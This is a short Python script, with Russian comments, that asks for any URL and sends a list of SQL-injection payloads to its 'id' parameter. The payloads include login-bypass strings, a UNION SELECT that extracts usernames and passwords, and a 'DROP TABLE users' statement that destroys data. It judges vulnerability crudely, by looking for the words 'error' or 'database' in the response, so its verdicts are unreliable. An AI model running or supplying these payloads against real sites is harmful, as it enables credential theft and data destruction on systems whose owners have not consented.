import requests

# Список payload'ов для проверки SQL-инъекций
payloads = [
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1' /*",
    "' UNION SELECT null, username, password FROM users --",
    "'; DROP TABLE users; --"
]

def check_sql_injection(url):
    for payload in payloads:
        # Предположим, что параметр, который проверяем, называется 'id'
        response = requests.get(url, params={'id': payload})
        if "error" in response.text or "database" in response.text:
            print(f"Possible SQL injection vulnerability detected with payload: {payload}")
        else:
            print(f"No vulnerability detected with payload: {payload}")

if __name__ == "__main__":
    target_url = input("Enter the URL to check for SQL injection: ")
    check_sql_injection(target_url)
